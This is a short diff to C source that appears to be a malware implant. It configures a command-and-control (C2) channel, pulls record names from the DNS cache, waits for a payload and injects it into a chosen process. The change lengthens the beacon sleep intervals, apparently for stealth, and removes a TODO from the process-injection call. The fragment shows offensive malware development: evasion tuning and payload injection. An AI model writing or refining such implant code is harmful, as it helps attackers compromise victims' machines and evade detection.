@@ -410,8 +410,8 @@ int main(int argc, char **argv)
     channel.c2_server_port = 0;
     channel.c2_server_url = NULL;
 
-    unsigned long sleep_min = 1000;
-    unsigned long sleep_max = 5000;
+    unsigned long sleep_min = 15000;
+    unsigned long sleep_max = 65000;
 
     // Get DNS cache and extract record names
     while (!record_count)
@@ -443,7 +443,7 @@ int main(int argc, char **argv)
             // If data.size is set, that means we received data
             if (data.size)
             {
-                int PID = GetInjectProcess(); // TODO
+                int PID = GetInjectProcess();
                 dprintf("received data size: %zu\n", data.size);
                 dprintf("start of data.memory: %s\n", data.memory);
                 // On successful inject, don't keep asking for the payload
